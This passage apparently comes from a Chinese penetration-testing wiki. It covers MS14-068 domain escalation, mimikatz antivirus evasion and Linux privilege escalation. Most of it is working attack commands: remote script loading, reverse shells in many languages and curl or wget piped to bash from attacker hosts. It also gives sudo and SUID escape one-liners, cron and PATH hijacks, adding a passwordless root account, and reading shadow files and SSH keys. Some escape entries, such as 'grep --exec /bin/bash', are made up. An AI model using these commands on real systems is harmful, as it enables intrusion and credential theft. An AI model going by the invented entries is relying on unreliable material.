MS14-068当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。 MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。 Copysysteminfo |find 3011780#为空说明该服务器存在MS14-068漏洞 操作链接：MS14-068复现(CVE-2014-6324)：https://www.cnblogs.com/-mo-/p/11890539.html 0x06 其他6.1 使用mimikatz导出chrome中的密码详情请见：链接 6.2 隐藏功能管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能： Copyprivilege::debugmisc::cmdmisc::regeditmisc::taskmgr 6.3 免杀处理Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。 首先在本地对Invoke-Mimikatz.ps1进行加密处理： Copypoweshell.exe Import-Module .\\Out-EncryptedScript.ps1poweshell.exe Out-EncryptedScript -ScriptPath .\\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数#默认生成的文件是evil.ps1-Password 设置加密的密钥-Salt 随机数，防止被暴力破解 将加密生成的evil.sp1脚本放在目标机上，执行如下命令： Copy#远程加载解密脚本poweshell.exe IEX(New-Object Net.WebClient).DownloadString(http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1)[String] $cmd = Get-Content .\\evil.ps1Invoke-Expression $cmd$decrypted = de password saltInvoke-Expression $decryptedInvoke-Mimikatz","tags":[null]},{"title":"Linux提权","path":"/wiki/内网/提权/Linux提权.html","content":"基础知识信息收集操作系统| plain uname -a # 打印所有可用的系统信息 uname -r # 内核版本 uname -n # 系统主机名。 uname -m # 查看系统内核架构（64位/32位） uname -mrs # 查看系统内核架构（64位/32位） hostname # 系统主机名 cat /proc/version # 内核信息 cat /etc/*-release # 分发信息 cat /etc/issue # 分发信息 cat /proc/cpuinfo # CPU信息 cat /etc/lsb-release # Debian based cat /etc/redhat-release # Redhat based ls /boot | grep vmlinuz-\t# 内核版本 || — | 环境变量 plain env # 显示环境变量 set # 现实环境变量 echo %PATH # 路径信息 history # 显示当前用户的历史命令记录 pwd # 输出工作目录 cat /etc/profile # 显示默认系统变量 cat /etc/shells # 显示可用的shellrc cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout cat /proc/??/environ # ??表示两个符号 打印机服务 plain lpstat -a 用户和群组| plain cat /etc/passwd # 列出系统上的所有用户 cat /var/mail/root cat /var/spool/mail/root cat /etc/group # 列出系统上的所有组 grep -v -E ^# /etc/passwd | awk -F: $3 == 0 { print $1} # 列出所有的超级用户账户 whoami # 查看当前用户 w # 谁目前已登录，他们正在做什么 last # 最后登录用户的列表 lastlog # 所有用户上次登录的信息 lastlog –u %username% # 有关指定用户上次登录的信息 lastlog |grep -v Never # 以前登录用户的完整信息 || — | 用户权限信息 plain whoami 当前用户名 id 当前用户信息 cat /etc/sudoers 谁被允许以root身份执行 sudo -l 当前用户可以以root身份执行操作 进程和服务 plain ps aux ps -ef top cat /etc/services 查看以 root 运行的进程 | plain ps aux | grep root ps -ef | grep root || — | 查看安装的软件 plain ls -alh /usr/bin/ ls -alh /sbin/ ls -alh /var/cache/yum/ dpkg -l 服务插件检查有没有不安全的服务配置，和一些有漏洞的插件。 | plain cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk $1 ~ /^.*r.*/ || — | 计划任务| plain crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root || — | 有无明文存放用户密码| plain grep -i user [filename] grep -i pass [filename] grep -C 5 password [filename] find , -name *.php -print0 | xargs -0 grep -i -n var $password || — | 比如说可能使用邮件明文传输密码； 又或者说 MySQL 中明文存放用户密码。 有无 ssh 私钥 plain cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key 查看与当前机器通信的其他用户或者主机| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || — | 日志文件 plain cat /var/log/boot.log cat /var/log/cron cat /var/log/syslog cat /var/log/wtmp cat /var/run/utmp cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp 敏感文件 plain cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ ls -ahlR /root/ ls -ahlR /home/ 特殊的数据库、配置文件 plain cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 交互式shell plain python -c import pty;pty.spawn(/bin/bash) echo os.system(/bin/bash) /bin/sh -i 查看安装过的工具 plain find / -name perl* find / -name python* find / -name gcc* ... 通讯与网络系统有哪些 NIC？它是否连接到另一个网络？ plain /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 网络配置设置是什么？你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？ plain cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 还有哪些其他用户和主机正在与系统通信？| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || — | 缓存了什么？IP 和或 MAC 地址 plain arp -e route /sbin/route -nee 数据包嗅探可能吗？能看到什么？ plain tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 可提权SUID GUID参考资料https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ plain find / -perm -1000 -type d 2/dev/null # Sticky bit find / -perm -g=s -type f 2/dev/null # SGID (chmod 2000) find / -perm -u=s -type f 2/dev/null # SUID (chmod 4000) find / -perm -g=s -o -perm -u=s -type f 2/dev/null # SGID or SUID for i in `locate -r bin$`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2/dev/null; done # 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式） # 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2/dev/null 查看可写执行目录 plain find / -writable -type d 2/dev/null # world-writeable folders find / -perm -222 -type d 2/dev/null # world-writeable folders find / -perm -o w -type d 2/dev/null # world-writeable folders find / -perm -o x -type d 2/dev/null # world-executable folders find / \\( -perm -o w -perm -o x \\) -type d 2/dev/null # world-writeable executable folders proc 目录Linux 系统上的 font style=color:rgb(68, 68, 68);/proc/font 目录是一种文件系统，即 proc 文件系统。与其它常见的文件系统不同的是，font style=color:rgb(68, 68, 68);/proc/font 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 但需要注意，部分内容需要权限才可以读取。 plain /proc/self/cmdline # 启动当前进程的完整命令 /proc/self/cwd # 指向当前进程运行的工作区的符号链接 /proc/self/exe # 指向启动当前进程的可执行文件的符号链接 /proc/self/envrion # 查看进程的环境变量 /proc/self/fd/3 # 查看读取过的文件，输入输出缓冲区 /proc/self/maps # 内存映射信息 反弹shell反弹shell后获取模拟终端各种方法获取的 shell 都不是一个标准的虚拟终端环境，它们只是提供了一个标准输入。你会发现存在一个问题，即使我们获得了目标虚拟终端的控制权限，但通常会遇到以下几个交互性差和不稳定的问题： 缺乏交互性：获取的虚拟终端没有足够的交互功能。例如，我们无法为添加的账户设置密码或执行sudo等命令。 无法正常显示错误输出：标准的错误输出无法显示，这导致无法正确使用一些文本编辑器（如vim）等工具。 连接不稳定：获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接，这使得持续使用和进行长时间操作变得困难。 解决上述问题的方法是使用Python的pty（pseudo terminal）标准库来获取一个标准的虚拟终端环境。通过在已经获取的shell中输入以下命令，我们可以模拟一个终端设备： plain python -c import pty;pty.spawn(/bin/bash) 以上代码将调用font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);pty.spawn()/font函数，并将font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/bin/bash/font作为参数传递给它，从而创建一个新的终端会话。 通过使用这个方法，我们可以获得一个更加交互性强、可执行sudo等命令以及正确显示错误输出的标准终端环境。 bash 反弹# Alicenc -lvvp 12345# Bob/bin/bash -c bash -i /dev/tcp/x.x.x.x/12345 01 Bash 反弹 shell TCP plain # Alice nc -lvvp 4242 # Bob sh -i /dev/tcp/127.0.0.1/4242 01 Bash 反弹 shell UDP plain # Alice nc -u -lvvp 4242 # Bob sh -i /dev/udp/127.0.0.1/4242 01 以下是针对Bash反弹一句话进行了拆分说明： 命令 命令详解 font style=color:rgb(51, 51, 51);bash -i/font 产生一个bash交互环境。 font style=color:rgb(51, 51, 51);/font（和21 一个意思） 将联合符号前面的内容与后面相结合，然后一起重定向给后者。 font style=color:rgb(51, 51, 51);/dev/tcp/47.xxx.xxx.72/2333/font Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 font style=color:rgb(51, 51, 51);01/font 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。 Bash反弹一句完整的解读过程就是： Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。 Curl配合Bash反弹shell首先，在攻击者vps的web目录里面创建一个font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);index.php/font或font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);index.html/font,内容如下： | plain # Alice echo bash -i /dev/tcp/192.168.64.215/2333 01 index.html # 临时起Web服务的三种方法 # python -m SimpleHTTPServer 8080 # python3 -m http.server 8080 # php -S 0.0.0.0:8080 # 监听 nc -lvvp 2333 # Bob curl 192.168.64.215|bash || — | Curl 配合 Bash 反弹 shell 的方式在 CTF（Capture The Flag）题目中经常被使用。具体的命令是 font style=color:rgb(245, 57, 0);curl IP|bash/font，其中的 IP 可以是任意格式，包括但不限于十进制、十六进制、八进制和二进制等。 NC反弹netcat -e 被阉割的话 wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificatetar -xvzf netcat-0.7.1.tar.gzcd tar -xvzf netcat-0.7.1.tar.gz./configuremake make installmake clean # Alicenc -lvvp 2333# Bobnetcat 192.168.64.215 2333 -e /bin/bash# nc 攻击机IP 攻击机监听的端口 -e /bin/bash Crontab反弹shellProfile反弹shell当用户打开新的 bash 窗口时，font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/etc/profile/font 文件中的内容会被执行。 需要注意的是，对 font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/etc/profile/font 文件的修改需要进行管理员权限操作（例如使用 font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);sudo/font 或以管理员身份登录）。 plain /bin/bash -i /dev/tcp/192.168.64.215/2333 01 # 最后面那个为的是防止管理员无法输入命令 MSF反弹shell使用命令 font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);msfvenom -l/font 结合关键字过滤（例如 font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);cmd/unix/reverse/font），可以列出符合条件的各类反弹shell一句话payload，具体使用方法如下： | plain ┌──(root㉿kali)-[/home/kali] └─# msfvenom -l payloads | grep cmd/unix/reverse || — | 以上命令将在所有可用的payload中筛选并列出符合关键字font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);cmd/unix/reverse/font的项，这些项包含各种反弹shell一句话payload的生成参数和选项。 如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话： plain ┌──(root㉿kali)-[/home/kali] └─# msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=2333 -f raw [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 356 bytes python -c exec(__import__(zlib).decompress(__import__(base64).b64decode(__import__(codecs).getencoder(utf-8)(eNqNUMEKgzAM/RXpqYJUrYcdRg8yHIyxDaZ3mV1FmWuKqf+/FoXRmwlJSPLyHmT8GphthCA/ykZRgktnZpAK0TXg0mZHFwOgFSTnB5Y5z0mw9DSCF0URTFGszGwtdOvKc3u5V43XWwf143Rt6+ZZlbc4JGAStFbSUurl3YUXikMQIHsvhlNk/TgpDdStk2wHJt+B4SHGiP+LmHxNEyVpN+oUBxL/AAt8WAg=)[0]))) ┌──(root㉿kali)-[/home/kali] └─# nc -lvvp 2333 常见脚本1. Python python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((x.x.x.x,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/bash,-i]); 2. Perl 方法一： perl -e use Socket;$i=x.x.x.x;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));if(connect(S,sockaddr_in($p,inet_aton($i))))open(STDIN,S);open(STDOUT,S);open(STDERR,S);exec(/bin/sh -i);; 方法二： perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,x.x.x.x:5555);STDIN-fdopen($c,r);$~-fdopen($c,w);system$_ while; 3. Ruby 方法一： ruby -rsocket -e exit if fork;c=TCPSocket.new(x.x.x.x,5555);while(cmd=c.gets);IO.popen(cmd,r)|io|c.print io.readend 方法二： ruby -rsocket -ef=TCPSocket.open(x.x.x.x,5555).to_i;exec sprintf(/bin/sh -i %d %d 2%d,f,f,f) 4. PHP php -r $sock=fsockopen(x.x.x.x,5555);exec(/bin/bash -i 3 3 23); 5. Java public class Revs /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= /bin/bash,-c,exec 5/dev/tcp/x.x.x.x/5555;cat 5 | while read line; do $line 25 5; done; Process p = r.exec(cmd); p.waitFor(); 6. Lua lua -e require(socket);require(os);t=socket.tcp();t:connect(x.x.x.x,5555);os.execute(/bin/sh -i 3 3 23); 注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听: nc -lvvp 5555 sudo提权初始尝试通过使用交换用户font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);su/font命令生成root sudo su 其他方法有些时候不允许执行 su 计划，则有许多其他方法可以升级特权： sudo -s sudo -i sudo /bin/bash sudo passwd 外壳逃生序列以下这些程序如果被配置使用root权限启动，且该第三方服务或者程序存在漏洞或者配置问题，那么就可以被利用来获得root权限。** 并且还要知道当前用户的密码 **可以利用sudo提权的命令如下 ： wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp 查看用户能以root权限运行的命令 sudo -l https://gtfobins.github.io/ 这里查看详细方法 01.git 提权sudo git help addsudo git help configsudo git -p help//三选一输密码再!/bin/bash即可 02.find提权普通用户find命令提权必要条件：find必须有s执行权限，有s表示可以提权先查看find命令有没有提权的可能:尝试执行whoami : find / -type f -name getroot -exec whoami \\;这里的反斜杠\\是用来转义分号;的 尝试调出一个交互式的binsh并且是root权限 sudo find /home -exec /bin/bash \\; 此shell 为不完整的shell， 升级交互式。 #在反弹shell上执行[root@localhost ~]# python -c import pty; pty.spawn(/bin/bash)[root@localhost ~]# ctrl +z 按键。挂起正在运行的程序[kali机器 ~]# stty raw -echo# 输入这个命令 在输入命令终端不再显示[kali机器 ~]#fg# 把后台挂起的程序，放入到控制台。终端不再显示命令，输入后回撤[root@localhost ~]# reset 用find进行反弹shell find /etc/passwd -exec bash -ip /dev/tcp/192.168.1.130/2333 01 \\; find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \\; find+python进行反弹shell find /etc/passwd -exec python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.1.130,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-ip]); \\; 03.zip提权( 核心sudo没有该命令,失效 )zip 命令用于压缩文件，是个 使用广泛的压缩程序，压缩后的文件后缀名为 .zip。通过压缩一个存在的文件，并调用-T参数输出shell1. 下载zip（如果没有）apt install zip2. 创建一个1.txt，将其压缩为1.zip3. 执行 touch 1.txtsudo zip 1.zip 1.txt -T --unzip-command=sh -c /bin/bash或touch 1.txtsudo -u root zip 1.zip 1.txt -T -unzip-command=sh -c /bin/bash 04.awkmorpheus提权sudo awk BEGIN system(/bin/sh)sudo morpheus BEGIN system(/bin/sh) 05.less**more**提权sudo less /etc/hosts!bash//若已被分配root权限less /etc/passwd!/bin/sh 06.man提权sudo man man!bash 07.env提权sudo env /bin/bash 08.ed提权sudo ed!/bin/bash 09.apt提权TF=$(mktemp)echo Dpkg::Pre-Invoke /bin/sh;false $TFsudo apt-get install -c $TF sl 10.pip提权TF=$(mktemp -d)echo import os; os.execl(/bin/sh, sh, -c, sh $(tty) $(tty) 2$(tty)) $TF/setup.pysudo pip install $TF 11.sed提权sudo sed -n 1e exec sh 10 /etc/passwd 12.tmux提权sudo tmux 13.nmap提权版本5.0一下进入nmap交互模式 sudo nmap --interactive 14.taskset提权sudo taskset 1 /bin/sh -p 15.scp提权TF=$(mktemp)echo sh 02 12 $TFchmod +x $TFsudo scp -S $TF x y: 16.ftp提权sudo ftp !/bin/bash 17.perl提权sudo perl -e exec /bin/bash; suid提权SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。 以下命令可以找到正在系统上运行的所有SUID可执行文件。 plain find / -user root -perm -4000 -print 2/dev/null find / -perm -u=s -type f 2/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; https://gtfobins.github.io/ # awkawk BEGIN system(/bin/bash)# base64（把 /bin/bash 编码一次绕过过滤）base64 -d YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC85MDAxIDA+JjE= | bash# busyboxbusybox sh# cp 覆盖 sudoerscp /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p cp /tmp/p /etc/passwd su root2# cpioecho /bin/bash 777 0 0 /tmp/x cpio -o /tmp/x 2/dev/null | cpio -i --to-stdout 2/dev/null | bash# dockerdocker run -v /:/mnt --rm -it alpine chroot /mnt sh# eded!/bin/bash^D# envenv /bin/bash# expand（GNU coreutils）expand /etc/passwd # 仅读文件；若需 shell 用 env 模式env expand# expectexpect -c spawn /bin/bash; interact# file（读任意）file -f /etc/shadow# findfind / -exec /bin/bash \\;# flockflock -u / /bin/bash# gdbgdb -nx -ex python import os; os.setuid(0); os.system(/bin/bash) -ex quit# gitgit help config!/bin/bash# grepgrep /etc/passwd# 仅读；shell 用grep --exec /bin/bash# gzipgzip -c /etc/passwd | gzip -d | bash# headhead /etc/shadow# 仅读；shell 用head --exec /bin/bash# hexdumphexdump -C /etc/shadow# 仅读；shell 用hexdump --exec /bin/bash# ioniceionice /bin/bash# ipip netns add fooip netns exec foo /bin/bash# jjs (OpenJDK)echo Java.type(java.lang.Runtime).getRuntime().exec(/bin/bash) | jjs# jqjq -n exec(/bin/bash)# kshksh# ld.so 直接加载 bash/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash# lessless /etc/passwd!/bin/bash# logsavelogsave /dev/null /bin/bash# looklook /etc/passwd# 仅读；shell 用look --exec /bin/bash# makemake -s --eval=$x: \\t/bin/bash x# manman man!/bin/bash# moremore /etc/passwd!/bin/bash# mountmount -o bind /bin/bash /bin/mountmount# msgfmt (gettext)msgfmt -o /dev/null (echo exec(/bin/bash))# mv 覆盖 sudoers 同 cp 套路mv /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p mv /tmp/p /etc/passwd su root2# nanonano -S /bin/bash# nicenice /bin/bash# nlnl /etc/passwd# 仅读；shell 用nl --exec /bin/bash# nohupnohup /bin/bash# odod -An -tx1 /etc/shadow# 仅读；shell 用od --exec /bin/bash# opensslopenssl req -x509 -newkey rsa:2048 -keyout /tmp/k -nodes -out /tmp/c -subj / openssl s_server -port 4444 -cert /tmp/c -key /tmp/k # 反向 shell 略# 直接 payloadRHOST=attacker.com RPORT=4444 openssl s_client -quiet -connect $RHOST:$RPORT 2/dev/null | bash 21 | openssl s_client -quiet -connect $RHOST:$RPORT /dev/null# perlperl -e use POSIX qw(setuid); setuid(0); system /bin/bash# pgpg /etc/passwd!/bin/bash# phpphp -r posix_setuid(0); system(/bin/bash);# picopico -s /bin/bash# python2/3python2 -c import os; os.setuid(0); os.system(/bin/bash)python3 -c import os; os.setuid(0); os.system(/bin/bash)# rakerake -f (echo task :x do system /bin/bash end) x# readelfreadelf -a /bin/su | less # 仅读# shell 用readelf --exec /bin/bash# resticRESTIC_REPOSITORY=/tmp restic init ; restic backup /etc/passwd # 仅读# shell 用restic mount /mnt -r /tmp chroot /mnt sh# revrev /etc/passwd | rev # 仅读# shell 用rev --exec /bin/bash# rloginrlogin -l root -E /bin/bash localhost# rlwraprlwrap /bin/bash# rpmrpm --eval %lua:os.execute(/bin/bash)# rsyncrsync -e sh -c sh 02 12 127.0.0.1:/dev/null# rubyruby -e Process.uid=0; exec /bin/bash# run-partsrun-parts --regex ^.*$ --exec /bin/bash /etc# rvimrvim -c :py import os; os.setuid(0); os.system(/bin/bash)# sedsed -e s/^/!/e /dev/stdin /bin/bash# setarchsetarch $(uname -m) /bin/bash# sftpsftp -o ProxyCommand=/bin/bash x# sh.distribsh.distrib# slsh (slang)slsh -e system(/bin/bash)# socatsocat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444# sortsort -m /etc/passwd # 仅读# shell 用sort --exec /bin/bash# sqlite3sqlite3 /dev/null .shell /bin/bash# sshssh -o ProxyCommand=/bin/bash x# start-stop-daemonstart-stop-daemon -n x -S -x /bin/bash# stdbufstdbuf -i0 -o0 -e0 /bin/bash# stracestrace -o /dev/null /bin/bash# stringsstrings /etc/shadow # 仅读# shell 用strings --exec /bin/bash# sysctlsysctl -w kernel.core_pattern=|/bin/bash sleep 100 kill -SIGSEGV $!# systemctlTF=$(mktemp).serviceecho [Service]Type=oneshotExecStart=/bin/bash[Install]WantedBy=multi-user.target $TFsystemctl link $TFsystemctl enable --now $(basename $TF)# tailtail -f /etc/shadow # 仅读# shell 用tail --exec /bin/bash# tartar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/bash# tasksettaskset 1 /bin/bash# tclshtclshexec /bin/bash# teetee /proc/self/fd/8 # 仅写# shell 用echo /bin/bash | tee /tmp/x chmod +x /tmp/x /tmp/x# telnettelnet 127.0.0.1 4444 | bash# timetime /bin/bash# timeouttimeout 7d /bin/bash# ulul /etc/passwd # 仅读# shell 用ul --exec /bin/bash# unexpandunexpand --exec /bin/bash# uniquniq /etc/passwd # 仅读# shell 用uniq --exec /bin/bash# unshareunshare -r /bin/bash # user-ns root# unzip -Z (Info-ZIP)unzip -Z ../x.zip # 仅读# shell 用unzip -Z --exec /bin/bash# update-alternativesupdate-alternatives --install /bin/sh sh /bin/bash 0# uudecodeuudecode -o /dev/stdout (uuencode /bin/bash) | bash# valgrindvalgrind /bin/bash# vi/vimvi:!/bin/bash# viewview /etc/passwd:!/bin/bash# vigrvigr # 编辑 /etc/group 时可 !/bin/bash# vipwvipw # 编辑 /etc/passwd 时可 !/bin/bash# watchwatch -x /bin/bash# wgetwget -qO- http://attacker.com/sh | bash# whoiswhois -h x.x.x.x -p 4444 | bash# xargsxargs -a /dev/null /bin/bash# xxdxxd /etc/shadow | xxd -r # 仅读# shell 用xxd --exec /bin/bash# yelp (gnome)yelp man:bash!/bin/bash# zipzip /tmp/x.zip /etc/passwd -T -TT /bin/bash# zshzsh# zsoelimzsoelim -p /bin/bash 计划任务提权系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是etc内系统的计划任务可以被列出。 crontab -e 编辑计划任务 crontab -l 查看计划任务 crontab -r 删除目前的crontab ls -l etccron* cat etccrontab 文件重写1.查看system-wide crontab的内容：cat /etc/crontab 2.在服务器上查找overwrite.sh 文件：locate overwrite.sh /usr/local/bin/overwrite.sh 3.检查文件的权限ls -l /usr/local/bin/overwrite.sh 注意：这个文件是可写的 4.将 overwrite.sh文件的内容替换为：#!/bin/bash bash -i /dev/tcp/192.168.175.130/4444 01 5.kali上运行nc等待 cron jobs运行，返回root权限 环境变量劫持查看定时任务： 发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令，如 17 * * * * root shell.sh 而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持。 比如在 sbin 写入一个 反弹 shell 功能的 shell.sh，那么就可以造成提权。 2.在homeuser 中创建文件 overwrite.sh，内容如下：#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash 3.加权$ chmod +x /home/user/overwrite.sh 4.等待cronjob运行（此作业尤其每分钟运行一次）。5.创建tmprootbash文件执行它，使用与-p保存有效的UID /tmp/rootbash –p 通配符https://www.secpulse.com/archives/72965.html 环境变量提权环境劫持需要的两个条件 存在带有suid的文件suid文件存在系统命令 且这个文件中必须有系统命令，这样我们就可以命名一个和这个系统命令相同的文件写入binbash； 再将存放这个文件的路径加入环境变量中，当系统去执行这个带有系统命令的文件时；就会直接执行我们命名和这个系统命令相同的文件；而非真实的系统命令；从而实现劫持环境变量提权。 寻找suidfind / -perm -u=s -type f 2/dev/null假设发现 /usr/local/bin/restore 是 SUID-root，属主 root。 逆向strings /usr/local/bin/restore | grep -E ^/(s?bin|usr)或者运行一下这个，看看有什么 劫持假设发现了 homelvxyzscriptdemo 我们运行一下这个文件，发现它会执行 ps命令 1.echo我们就往tmp写入 一个同名文件，内容为 binbash cd /tmpecho /bin/bash pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo 2.cp我们就往tmp写入 一个同名文件，内容为 binbash cd /tmpcp /bin/bash /tmp/pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo 密码提权grep --color=auto -rnw / -ie PASSWORD --color=always 2 /dev/nullfind . -type f -exec grep -i -I PASSWORD /dev/null \\;strings /dev/mem -n10 | grep -i PASSlocate password | morefind . -name *.php -print0 | xargs -0 grep -i -n var $passwordfind / -name authorized_keys 2 /dev/nullfind / -name id_rsa 2 /dev/null 一、可读shadow文件利用提权ls-al etcshadow # 查看文件属性，确保当前用户对shadow文件具有可读权限 cat etcshadow |grep’:$‘# 查看shadow文件夹，grep相当于过滤器，后面接过滤条件 在etcshadow文件中，每个用户的密码都是用一个特定的哈希函数加密的。为了避免密码被轻易破解，Linux 系统会使用不同的哈希函数来加密密码。而$y$中的y字符则表示使用的是哪种哈希函数，不同的哈希函数对应不同的字符。以下是一些常见的 $y$ 值及其对应的哈希函数： $1$表示使用的是 MD5 哈希函数； $2$或$2a$表示使用的是 Blowfish 哈希函数； $5$表示使用的是 SHA-256 哈希函数； $6$表示使用的是 SHA-512 哈希函数。 sudo john –wordlistusrsharewordlistrockyou.txt hash.txt # john进行破解 二、可写shadow文件利用提权cp etcshadow tmpshadow.bak # 备份重要文件 